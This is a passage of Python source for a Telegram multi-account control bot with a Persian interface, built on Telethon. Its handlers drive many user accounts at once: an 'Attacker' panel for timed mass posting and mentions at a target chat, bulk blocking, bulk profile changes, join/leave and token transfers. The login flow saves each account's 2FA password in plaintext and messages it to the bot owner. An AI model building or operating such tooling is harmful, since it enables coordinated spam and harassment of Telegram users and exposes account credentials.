                    f" سشن: {og_sess}\n"
                    f" گپ: {og_chat}\n"
                    f"📝 متن: {text[:60]}{'...' if len(text)>60 else ''}\n\n"
                    f" حالا زمان ارسال رو بنویس (به وقت تهران):\n\n"
                    f"فرمت‌های مجاز:\n"
                    f"• YYYY-MM-DD HH:MM  (مثال: 2025-07-10 14:30)\n"
                    f"• HH:MM  (همین امروز یا فردا اگه گذشته)\n"
                    f"• +Xm  (مثال: +30m = ۳۰ دقیقه دیگه)\n"
                    f"• +Xh  (مثال: +2h = ۲ ساعت دیگه)\n"
                    f"• +Xs  (مثال: +90s = ۹۰ ثانیه دیگه)",
                    buttons=[[Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())]])
              return

          # ── Scheduled Message: time input ─────────────────
          if og_step == "sched_time":
              og_gname = pend.get("og_gname", "")
              og_sess  = pend.get("og_sess", "")
              og_chat  = pend.get("og_chat", "")
              og_text  = pend.get("og_text", "")
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)

              # ── parse time (Tehran timezone) ──────────────
              raw_time   = text.strip()
              now_tehran = datetime.now(IRAN_TZ)
              send_dt    = None
              try:
                    if raw_time.startswith("+"):
                        spec = raw_time[1:].strip().lower()
                        if spec.endswith("h"):
                            delta_secs = float(spec[:-1]) * 3600
                        elif spec.endswith("m"):
                            delta_secs = float(spec[:-1]) * 60
                        elif spec.endswith("s"):
                            delta_secs = float(spec[:-1])
                        else:
                            delta_secs = float(spec)
                        send_dt = now_tehran.replace(microsecond=0) + timedelta(seconds=delta_secs)
                    elif ":" in raw_time and len(raw_time) <= 5:
                        h, m    = raw_time.split(":")
                        cand    = now_tehran.replace(hour=int(h), minute=int(m), second=0, microsecond=0)
                        if cand <= now_tehran:
                            cand = cand + timedelta(days=1)
                        send_dt = cand
                    else:
                        for fmt in ("%Y-%m-%d %H:%M", "%d/%m/%Y %H:%M", "%Y/%m/%d %H:%M"):
                            try:
                                send_dt = IRAN_TZ.localize(datetime.strptime(raw_time, fmt))
                                break
                            except ValueError:
                                pass
              except Exception:
                    pass

              if send_dt is None:
                    await sp(event.chat_id,
                        " فرمت زمان نادرست بود.\n"
                        "مثال‌ها:\n"
                        "• 2025-07-10 14:30\n"
                        "• 14:30\n"
                        "• +30m",
                        buttons=[[Button.inline("🔙 Back", f"og_sched_{og_gname}".encode())]])
                    return

              now_utc   = datetime.utcnow().replace(tzinfo=pytz.utc)
              wait_secs = (send_dt.astimezone(pytz.utc) - now_utc).total_seconds()
              if wait_secs < 60:
                    await sp(event.chat_id,
                        " زمان انتخابی باید حداقل ۱ دقیقه در آینده باشه\n(محدودیت تلگرام).",
                        buttons=[[Button.inline("🔙 Back", f"og_sched_{og_gname}".encode())]])
                    return

              # ── use Telegram's native schedule feature ─────
              meta = managed.get(og_sess)
              if not meta:
                    await sp(event.chat_id,
                        f" سشن {og_sess} آفلاینه — ابتدا آنلاینش کن.",
                        buttons=[[Button.inline("🔙 Back", f"og_sched_{og_gname}".encode())]])
                    return

              # convert to UTC unix timestamp (required by Telegram API)
              import calendar as _cal
              send_dt_utc = send_dt.astimezone(pytz.utc)
              schedule_ts = int(_cal.timegm(send_dt_utc.timetuple()))
              send_ts_str = send_dt.strftime("%Y-%m-%d %H:%M")

              try:
                    # resolve entity first so Telegram knows the target chat
                    chat_entity = await meta["client"].get_entity(og_chat)
                    await meta["client"].send_message(chat_entity, og_text, schedule=schedule_ts)
                    log.info(f"[sched] پیام native-scheduled: {og_sess} → {og_chat} @ {send_ts_str}")
              except Exception as e:
                    log.warning(f"[sched] خطا در schedule: {e}")
                    await sp(event.chat_id,
                        f" خطا در زمانبندی پیام:\n{e}",
                        buttons=[[Button.inline("🔙 Back", f"og_sched_{og_gname}".encode())]])
                    return

              mins      = int(wait_secs // 60)
              hours_r   = mins // 60
              time_str  = (f"{hours_r}ساعت و {mins%60}دقیقه" if hours_r > 0
                             else f"{mins}دقیقه")
              await sp(event.chat_id,
                    f" پیام توی Scheduled Messages تلگرام ثبت شد!\n"
                    f"━━━━━━━━━━━━━━\n"
                    f" سشن: {og_sess}\n"
                    f" گپ: {og_chat}\n"
                    f" زمان ارسال: {send_ts_str} (تهران)\n"
                    f" تا ارسال: {time_str}\n"
                    f"📝 متن: {og_text[:80]}{'...' if len(og_text)>80 else ''}\n\n"
                    f" برای لغو — توی اون اکانت تلگرام Scheduled Messages رو باز کن.",
                    buttons=[
                        [Button.inline("📋 پنل زمانبندی", f"og_sched_{og_gname}".encode()),
                         Button.inline("📋 Menu", b"menu_refresh")],
                    ])
              return

          # ── Bulk Self interval reply — set target ─────────
          if og_step == "bself_target":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_gname = pend.get("og_gname", "")
              tgt = text.strip()
              if not tgt:
                    await sp(event.chat_id, " آیدی یا @username گپ رو بفرست.",
                            buttons=[[Button.inline("❌ Cancel", f"og_bself_looppanel_{og_gname}".encode())]])
                    return
              groups_db.setdefault(og_gname, {})["bself_target"] = tgt
              save_groups()
              await sp(event.chat_id, f" گپ هدف روی «{tgt}» تنظیم شد.",
                        buttons=[[Button.inline("⏰ Interval Reply", f"og_bself_looppanel_{og_gname}".encode())]])
              return

          # ── Bulk Self media caption ───────────────────────
          if og_step == "bself_media_caption":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_gname = pend.get("og_gname", "")
              og_file = pend.get("og_file", "")
              og_mtype = pend.get("og_mtype", "photo")
              caption = "" if text in ("/skip", "/done") else text
              cnt_added = 0
              for s in og_sessions(og_gname):
                    meta = managed.get(s)
                    if meta and og_file:
                        meta["state"].setdefault("self_reply_media", []).append(
                            {"path": og_file, "type": og_mtype, "caption": caption})
                        save_session_state(s, meta["state"])
                    elif og_file:
                        st = load_session_state(s)
                        st.setdefault("self_reply_media", []).append(
                            {"path": og_file, "type": og_mtype, "caption": caption})
                        save_session_state(s, st)
                    cnt_added += 1
              await sp(event.chat_id,
                    f" {og_mtype} با کپشن به {cnt_added} اکانت اضافه شد. فایل دیگه بفرست یا /done:",
                    buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{og_gname}".encode())]])
              # Keep pending so more files can be uploaded
              pending_group_selection[event.sender_id] = {"og_step": "bself_media", "og_gname": og_gname, "og_mtype": og_mtype}
              return

          # ── Block by user ID (all accounts) ──────────────
          if og_step == "blockid":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_gname = pend.get("og_gname", "")
              try:
                    target_uid = int(text.strip())
              except ValueError:
                    await sp(event.chat_id, " آیدی باید عدد باشه (مثال: 123456789)",
                            buttons=[[Button.inline("❌ Cancel", f"og_home_{og_gname}".encode())]])
                    return
              from telethon.tl.functions.contacts import BlockRequest
              from telethon.tl.types import InputUser, InputPeerUser
              ok = 0
              fail = 0
              for s in og_sessions(og_gname):
                    meta = managed.get(s)
                    if not meta:
                        continue
                    try:
                        # try to resolve proper access_hash first
                        try:
                            _ue = await meta["client"].get_input_entity(target_uid)
                        except Exception:
                            _ue = InputUser(user_id=target_uid, access_hash=0)
                        await meta["client"](BlockRequest(id=_ue))
                        ok += 1
                    except Exception as e:
                        log.warning(f"[blockid] {s} -> {target_uid}: {e}")
                        fail += 1
              await sp(event.chat_id,
                    f" Block نتیجه برای {target_uid}:\n موفق: {ok}   خطا: {fail}",
                    buttons=[[Button.inline("👥 Group", f"og_home_{og_gname}".encode())]])
              return

          # ── Referral new label ───────────────────────────
          # ── OG Attacker steps ────────────────────────────
          if og_step == "ogatk_target":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              atk = _og_atk_state(og_gname)
              atk["target"] = text.strip()
              save_groups()
              await sp(event.chat_id, f" مقصد Attacker: {text.strip()}",
                        buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              return

          if og_step == "ogatk_delay":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              try:
                    d = max(1, int(text))
                    atk = _og_atk_state(og_gname)
                    atk["delay"] = d
                    save_groups()
                    await sp(event.chat_id, f" تاخیر: {d} ثانیه",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " عدد صحیح وارد کن",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              return

          if og_step == "ogatk_seqinterval":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              try:
                    iv = max(0.1, float(text))
                    atk = _og_atk_state(og_gname)
                    atk["seq_interval"] = iv
                    save_groups()
                    await sp(event.chat_id, f"⏱ فاصله Sequential: {iv} ثانیه",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " عدد معتبر وارد کن (مثلاً ۱ یا ۰.۵)",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              return

          if og_step == "ogatk_autostop":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              try:
                    h = max(0.0, float(text))
                    atk = _og_atk_state(og_gname)
                    atk["auto_stop_hours"] = h
                    save_groups()
                    msg = f"⏰ خاموش خودکار: {h} ساعت" if h else "⏰ خاموش خودکار غیرفعال شد"
                    await sp(event.chat_id, msg,
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " عدد معتبر وارد کن (مثلاً ۲ یا ۱.۵ یا ۰ برای غیرفعال)",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              return

          if og_step == "ogatk_text":
              atk = _og_atk_state(og_gname)
              if text == "/done":
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    save_groups()
                    cnt = sum(1 for i in atk.get("items", []) if i["type"] == "text")
                    await sp(event.chat_id, f" {cnt} متن ثبت شد.",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              else:
                    atk.setdefault("items", []).append({"type": "text", "val": text})
                    save_groups()
                    cnt = sum(1 for i in atk["items"] if i["type"] == "text")
                    await sp(event.chat_id, f" متن #{cnt} ثبت شد. ادامه یا /done:")
              return

          if og_step == "ogatk_media_caption":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_file  = pend.get("og_file", "")
              og_mtype = pend.get("og_mtype", "photo")
              caption  = "" if text in ("/skip", "/done") else text
              atk = _og_atk_state(og_gname)
              atk.setdefault("items", []).append({"type": og_mtype, "val": og_file, "caption": caption})
              save_groups()
              cnt = sum(1 for i in atk["items"] if i["type"] == og_mtype)
              await sp(event.chat_id, f" {og_mtype} #{cnt} با کپشن «{caption or '—'}» ثبت شد.",
                        buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              return

          if og_step == "ogatk_tagadd":
              atk = _og_atk_state(og_gname)
              if text == "/done":
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    await sp(event.chat_id, f" {len(atk.get('mention_ids', []))} منشن ثبت شد.",
                            buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              else:
                    entry = text.strip()
                    if entry not in [str(x) for x in atk.get("mention_ids", [])]:
                        atk.setdefault("mention_ids", []).append(entry)
                        save_groups()
                    cnt = len(atk["mention_ids"])
                    await sp(event.chat_id, f" {entry} اضافه شد ({cnt} نفر). ادامه یا /done:")
              return

          if og_step == "ogatk_tagdel":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              atk = _og_atk_state(og_gname)
              entry = text.strip()
              atk["mention_ids"] = [x for x in atk.get("mention_ids", []) if str(x) != entry]
              save_groups()
              await sp(event.chat_id, f" حذف شد.",
                        buttons=[[Button.inline("⚔️ Attacker", f"ogatk_panel_{og_gname}".encode())]])
              return

          # ── mio transfer steps ────────────────────────────
          if og_step == "miotx_target":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(OWNER_ID, None)
              _og_miotx_state(og_gname)["target"] = text.strip()
              save_groups()
              await sp(event.chat_id, f"🎯 گروه مقصد تنظیم شد: {text.strip()}",
                        buttons=[[Button.inline("🪙 انتقال میویی", f"ogmiotx_panel_{og_gname}".encode())]])
              return

          if og_step == "miotx_recipient":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(OWNER_ID, None)
              _og_miotx_state(og_gname)["recipient_id"] = text.strip()
              save_groups()
              await sp(event.chat_id, f"💰 آیدی گیرنده تنظیم شد: {text.strip()}",
                        buttons=[[Button.inline("🪙 انتقال میویی", f"ogmiotx_panel_{og_gname}".encode())]])
              return

          # ── profile: name ─────────────────────────────────
          if og_step == "prfname":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              if not meta:
                    await sp(event.chat_id, f" {og_sess} آفلاینه",
                            buttons=[[Button.inline("🔙 Back", f"og_profile_{og_gname}".encode())]])
                    return
              parts = text.split(None, 1)
              fname = parts[0]
              lname = parts[1] if len(parts) > 1 else ""
              try:
                    await meta["client"](functions.account.UpdateProfileRequest(
                        first_name=fname, last_name=lname))
                    await sp(event.chat_id, f" نام {og_sess} تغییر کرد: {fname} {lname}",
                            buttons=[[Button.inline("🔙 Back", f"og_prf1_{og_gname}|{og_sess}".encode())]])
              except Exception as e:
                    await sp(event.chat_id, f" خطا: {e}",
                            buttons=[[Button.inline("🔙 Back", f"og_prf1_{og_gname}|{og_sess}".encode())]])
              return

          # ── profile: bio ──────────────────────────────────
          if og_step == "prfbio":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              if not meta:
                    await sp(event.chat_id, f" {og_sess} آفلاینه",
                            buttons=[[Button.inline("🔙 Back", f"og_profile_{og_gname}".encode())]])
                    return
              try:
                    await meta["client"](functions.account.UpdateProfileRequest(about=text[:70]))
                    await sp(event.chat_id, f" بیو {og_sess} تغییر کرد.",
                            buttons=[[Button.inline("🔙 Back", f"og_prf1_{og_gname}|{og_sess}".encode())]])
              except Exception as e:
                    await sp(event.chat_id, f" خطا: {e}",
                            buttons=[[Button.inline("🔙 Back", f"og_prf1_{og_gname}|{og_sess}".encode())]])
              return

          # ── bulk profile: name (همگانی) ───────────────────
          if og_step == "og_prfall_name":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              sessions_bulk = og_sessions(og_gname)
              parts = text.split(None, 1)
              fname = parts[0]
              lname = parts[1] if len(parts) > 1 else ""
              ok = fail = 0
              for s in sessions_bulk:
                    meta = managed.get(s)
                    if not meta:
                        fail += 1
                        continue
                    try:
                        await meta["client"](functions.account.UpdateProfileRequest(
                            first_name=fname, last_name=lname))
                        ok += 1
                        await asyncio.sleep(1)
                    except Exception:
                        fail += 1
              await sp(event.chat_id,
                    f" نام همگانی اعمال شد!\n━━━━━━━━━━━━━━\n موفق: {ok}   ناموفق: {fail}",
                    buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{og_gname}".encode())]])
              return

          # ── bulk profile: bio (همگانی) ────────────────────
          if og_step == "og_prfall_bio":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              sessions_bulk = og_sessions(og_gname)
              bio = text[:70]
              ok = fail = 0
              for s in sessions_bulk:
                    meta = managed.get(s)
                    if not meta:
                        fail += 1
                        continue
                    try:
                        await meta["client"](functions.account.UpdateProfileRequest(about=bio))
                        ok += 1
                        await asyncio.sleep(1)
                    except Exception:
                        fail += 1
              await sp(event.chat_id,
                    f" بیو همگانی اعمال شد!\n━━━━━━━━━━━━━━\n موفق: {ok}   ناموفق: {fail}",
                    buttons=[[Button.inline("🔙 Back", f"og_prfbulk_{og_gname}".encode())]])
              return

      # waiting for new group name
      if pend.get("waiting_newgroup"):
          name = text
          if name in groups_db:
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              await sp(event.chat_id, f" ریموت '{name}' قبلاً وجود داره.",
                         buttons=[[Button.inline("🔙 Back", b"menu_groups")]])
          else:
              pending_group_selection[OWNER_ID] = {"waiting_newgroup_owner": True, "new_group_name": name}
              await sp(event.chat_id,
                    f" آیدی عددی اونر ریموت «{name}»:\n"
                    f"(آیدی عددی مالک رو بنویس — این کسیه که ریموت رو کنترل میکنه)\n"
                    f"/skip برای خودت ({OWNER_ID})",
                    buttons=[[Button.inline("❌ Cancel", b"menu_groups")]])
          return

      # waiting for new group owner id
      if pend.get("waiting_newgroup_owner"):
          name = pend.get("new_group_name", "")
          try:
              owner_id = OWNER_ID if text.strip() == "/skip" else int(text.strip())
          except ValueError:
              owner_id = OWNER_ID
          pending_group_selection[OWNER_ID] = {"waiting_newgroup_maxaccounts": True, "new_group_name": name, "new_group_owner": owner_id}
          await sp(event.chat_id,
              f" سقف تعداد اکانت برای ریموت «{name}»:\n"
              f"(عدد بنویس — مثلاً 5)\n"
              f"/skip برای بدون محدودیت",
              buttons=[[Button.inline("❌ Cancel", b"menu_groups")]])
          return

      # waiting for new group max accounts
      if pend.get("waiting_newgroup_maxaccounts"):
          name = pend.get("new_group_name", "")
          owner_id = pend.get("new_group_owner", OWNER_ID)
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          max_accounts = None
          if text.strip() != "/skip":
              try:
                    max_accounts = int(text.strip())
                    if max_accounts <= 0:
                        max_accounts = None
              except ValueError:
                    max_accounts = None
          group_data = {"owner": owner_id, "sessions": [], "owner_only_first": True}
          if max_accounts:
              group_data["max_accounts"] = max_accounts
          groups_db[name] = group_data
          save_groups()
          max_str = f"سقف: {max_accounts} اکانت" if max_accounts else "بدون محدودیت"
          await sp(event.chat_id,
              f" ریموت «{name}» ساخته شد.\nاونر: {owner_id}\n{max_str}",
              buttons=[[Button.inline(f"🏷 {name}", f"grp_{name}".encode()),
                          Button.inline("📋 Menu", b"menu_refresh")]])
          return

      # waiting for change group owner id
      if pend.get("waiting_changeowner"):
          gname = pend.get("change_owner_gname", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          try:
              owner_id = int(text.strip())
          except ValueError:
              await sp(event.chat_id, " آیدی باید عدد باشه",
                        buttons=[[Button.inline("🔙 Back", f"grp_{gname}".encode())]])
              return
          if gname in groups_db:
              groups_db[gname]["owner"] = owner_id
              save_groups()
          await sp(event.chat_id, f" اونر ریموت «{gname}» → {owner_id}",
                    buttons=[[Button.inline(f"🔘 {gname}", f"grp_{gname}".encode()),
                              Button.inline("📋 Menu", b"menu_refresh")]])
          return

      # waiting for phone number
      if pend.get("waiting_phone"):
          phone = text
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          sess = generate_next_session_name()
          tmp = _make_client(sess_path(sess), session_name=sess)
          try:
              await tmp.connect()
              await tmp.send_code_request(phone)
          except Exception as e:
              await sp(event.chat_id, f" خطا در ارسال کد: {e}",
                         buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
              try:
                    await tmp.disconnect()
              except Exception:
                    pass
              return
          pending_logins[phone] = {"tmp": tmp, "session": sess, "sender": OWNER_ID, "phone": phone}
          await sp(event.chat_id,
                     f" کد به {phone} ارسال شد.\n\nحالا کد رو اینجا بنویس:",
                     buttons=[[Button.inline("❌ Cancel", b"menu_refresh")]])
          pending_group_selection[OWNER_ID] = {"waiting_code": True, "phone": phone}
          return

      # waiting for code
      if pend.get("waiting_code"):
          phone = pend.get("phone", "")
          code = text
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          pend_login = pending_logins.get(phone)
          if not pend_login:
              await sp(event.chat_id, " جلسه لاگین منقضی شده.",
                         buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
              return
          tmp = pend_login["tmp"]
          sess = pend_login["session"]
          try:
              await tmp.sign_in(phone=phone, code=code)
          except SessionPasswordNeededError:
              await sp(event.chat_id, " رمز 2FA رو بنویس:",
                         buttons=[[Button.inline("❌ Cancel", b"menu_refresh")]])
              pending_group_selection[OWNER_ID] = {"waiting_2fa": True, "phone": phone, "sess": sess, "tmp_ref": phone}
              return
          except Exception as e:
              await sp(event.chat_id, f" خطا در ورود کد: {e}",
                         buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
              pending_logins.pop(phone, None)
              return
          sessions_db[sess] = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": []}
          save_db()
          try:
              await tmp.disconnect()
          except Exception:
              pass
          await asyncio.sleep(0.5)
          await start_worker(sess, phone=phone)
          pending_logins.pop(phone, None)
          await _bot_finish_group_inline(bot, sp, event.chat_id, sess, phone)
          return

      # waiting for 2FA password
      if pend.get("waiting_2fa"):
          phone = pend.get("phone", "")
          sess = pend.get("sess", "")
          pwd = text
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          pend_login = pending_logins.get(phone)
          if not pend_login:
              await sp(event.chat_id, " جلسه لاگین منقضی شده.",
                         buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
              return
          tmp = pend_login["tmp"]
          try:
              await tmp.sign_in(password=pwd)
          except Exception as e:
              await sp(event.chat_id, f" خطا در 2FA: {e}",
                         buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
              pending_logins.pop(phone, None)
              return
          sessions_db[sess] = {"phone": phone, "created_at": datetime.utcnow().isoformat(), "admins": [], "twofa": pwd}
          save_db()
          save_2fa_to_file(sess, phone, pwd)
          try:
              await tmp.disconnect()
          except Exception:
              pass
          await asyncio.sleep(0.5)
          await start_worker(sess, phone=phone)
          pending_logins.pop(phone, None)
          await _bot_finish_group_inline(bot, sp, event.chat_id, sess, phone)
          try:
              notif_2fa = f"<spoiler> 2FA جدید ثبت شد\nاکانت: {sess}\n شماره: {phone}\n رمز 2FA: {pwd}</spoiler>"
              await bot.send_message(OWNER_ID, notif_2fa, parse_mode="html")
          except Exception:
              pass
          return

      # waiting for group pick (when multiple groups exist)
      if pend.get("waiting_pick_group"):
          picked = text
          sess = pend.get("sess", "")
          phone = pend.get("phone", "")
          pending_group_selection.pop(event.sender_id, None);
          pending_group_selection.pop(OWNER_ID, None)
          if picked not in groups_db:
              await sp(event.chat_id, f" ریموت '{picked}' نیست. دوباره بنویس یا /panel رو بزن.")
              return
          _err = assign_session_to_group(sess, picked)
          if _err:
              await sp(event.chat_id, f" خطا: {_err}")
              return
          sessions_in_group = groups_db[picked].get("sessions", [])
          role_label = "👑 اکانت اول (مخصوص owner)" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
          await sp(event.chat_id,
                     f" اکانت {sess} به ریموت {picked} اضافه شد!\nنقش: {role_label}",
                     buttons=[[Button.inline("👤 Accounts", b"menu_sessions"),
                               Button.inline("📋 Menu", b"menu_refresh")]])

    # ── callback: owner group single-account join/leave pick ──
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_jlpick_(join|leave)_([^|]+)\|(.+)")))
    async def og_jlpick_cb(event):
      action = event.pattern_match.group(1).decode()
      og_gname = event.pattern_match.group(2).decode()
      if not og_guard(event, og_gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(3).decode()
      pend = (pending_group_selection.pop(event.sender_id, None)
              or pending_group_selection.pop(OWNER_ID, {}))
      target_link = pend.get("og_target", "")
      if not target_link:
          return await event.answer(" تارگت نامعلومه")
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" اکانت آفلاینه")
      try:
          if action == "join":
              from telethon.tl.functions.channels import JoinChannelRequest
              from telethon.tl.functions.messages import ImportChatInviteRequest
              link = target_link.strip().replace("https://", "").replace("http://", "")
              if "joinchat/" in link:
                    h = link.split("joinchat/")[-1].lstrip("/").split("?")[0]
                    await meta["client"](ImportChatInviteRequest(h))
              elif link.startswith("t.me/+"):
                    await meta["client"](ImportChatInviteRequest(link[6:]))
              elif link.startswith("+") and not link[1:].lstrip("+").isdigit():
                    await meta["client"](ImportChatInviteRequest(link.lstrip("+")))
              else:
                    lnk = "@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link
                    try:
                        ent = await meta["client"].get_entity(lnk)
                        await meta["client"](JoinChannelRequest(ent))
                    except Exception:
                        await meta["client"](JoinChannelRequest(lnk))
              label = "جوین شد"
          else:
              from telethon.tl.functions.channels import LeaveChannelRequest
              link = target_link.strip().replace("https://", "").replace("http://", "")
              lnk = "@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link
              try:
                    ent = await meta["client"].get_entity(lnk)
                    await meta["client"](LeaveChannelRequest(ent))
              except Exception:
                    await meta["client"](LeaveChannelRequest(lnk))
              label = "لفت شد"
          await event.answer(f" {sess} {label}!")
          await sp_edit(event, f" {sess} {label} از {target_link}",
                         buttons=[[Button.inline("➡️ Join/Leave", f"og_jl_{og_gname}".encode()),
                                   Button.inline("📋 Menu", b"menu_refresh")]])
      except Exception as e:
          await event.answer(" خطا")
          err_hint = ""
          if "INVITE_HASH" in str(e):
              err_hint = "\n هش لینک دعوت نادرست یا منقضی شده."
          elif "not part of" in str(e):
              err_hint = "\n برای عضو شدن، لینک دعوت (joinchat) بفرست نه آیدی."
          await sp_edit(event, f" خطا برای {sess}:\n{e}{err_hint}",
                         buttons=[[Button.inline("🔙 Back", f"og_jl_{og_gname}".encode())]])

    # ── callback: inline group pick button ────────────────────
    @bot.on(events.CallbackQuery(pattern=b"pickgrp_(.+)"))
    async def cb_pickgrp(event):
      if not owner_guard(event):
          return await event.answer()
      picked = event.pattern_match.group(1).decode()
      pend = pending_group_selection.get(OWNER_ID, {})
      sess = pend.get("sess", "")
      phone = pend.get("phone", "")
      if not sess or picked not in groups_db:
          await event.answer(" خطا")
          return
      pending_group_selection.pop(event.sender_id, None);
      pending_group_selection.pop(OWNER_ID, None)
      _err = assign_session_to_group(sess, picked)
      if _err:
          await event.answer(f" خطا: {_err}", alert=True)
          return
      sessions_in_group = groups_db[picked].get("sessions", [])
      role_label = "👑 اکانت اول (مخصوص owner)" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
      await sp_edit(event,
          f" اکانت {sess} به گروه {picked} اضافه شد!\nنقش: {role_label}",
          buttons=[[Button.inline("👤 Accounts", b"menu_sessions"),
                      Button.inline("📋 Menu", b"menu_refresh")]])
      await event.answer(" اضافه شد")
      # prompt for display name
      if sess in managed:
          pending_group_selection[OWNER_ID] = {"waiting_display_name": True, "sess_for_name": sess}
          await sp_edit(event,
              f" یه اسم نمایشی برای این اکانت بنویس:\n({sess})\n\n/skip برای پیش‌فرض",
              buttons=[[Button.inline("🔘 Skip", b"skip_display_name")]])

    @bot.on(events.CallbackQuery(data=b"skip_display_name"))
    async def cb_skip_display_name(event):
      if not owner_guard(event):
          return await event.answer()
      pending_group_selection.pop(event.sender_id, None);
      pending_group_selection.pop(OWNER_ID, None)
      await event.answer(" اسم پیش‌فرض حفظ شد")
      await sp_edit(event, " اسم نمایشی تنظیم نشد (پیش‌فرض).",
                     buttons=[[Button.inline("👤 Accounts", b"menu_sessions"),
                               Button.inline("📋 Menu", b"menu_refresh")]])


async def _bot_finish_group(spoiler_fn, chat_id, sess: str, phone: str) -> None:
    """Group assignment logic for plain-text bot interface."""
    owner_groups = [g for g, info in groups_db.items() if int(info.get("owner", 0)) == OWNER_ID]
    if len(owner_groups) == 0:
      gname, err = auto_add_to_owner_group(sess, OWNER_ID)
      if err:
          await spoiler_fn(chat_id, f" {err}")
          return
      sessions_in_group = groups_db.get(gname, {}).get("sessions", [])
      role_label = "👑 اکانت اول (مخصوص owner)" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
      await spoiler_fn(chat_id, f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {gname}\nنقش: {role_label}\nشماره: {phone}")
    elif len(owner_groups) == 1:
      gname = owner_groups[0]
      _err = assign_session_to_group(sess, gname)
      if _err:
          await spoiler_fn(chat_id, f" {_err}")
          return
      sessions_in_group = groups_db[gname].get("sessions", [])
      role_label = "👑 اکانت اول (مخصوص owner)" if len(sessions_in_group) == 1 else f"اکانت #{len(sessions_in_group)}"
      await spoiler_fn(chat_id, f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {gname}\nنقش: {role_label}\nشماره: {phone}")
    else:
      pending_group_selection[OWNER_ID] = {"sess": sess, "phone": phone}
      group_list = "\n".join([f"• {g} ({len(groups_db[g].get('sessions', []))} اکانت)" for g in owner_groups])
      await spoiler_fn(chat_id, f" چند ریموت دارید. اکانت {sess} رو کجا بذارم؟\n\n{group_list}\n\nبنویسید: /pickgroup <نام_گروه>")

async def _bot_finish_group_inline(bot, sp_fn, chat_id, sess: str, phone: str) -> None:
    """Group assignment logic for inline-button bot panel."""
    from telethon import Button
    owner_groups = [g for g, info in groups_db.items() if int(info.get("owner", 0)) == OWNER_ID]
    if len(owner_groups) == 0:
      gname, err = auto_add_to_owner_group(sess, OWNER_ID)
      if err:
          await sp_fn(chat_id, f" {err}", buttons=[[Button.inline("📋 Menu", b"menu_refresh")]])
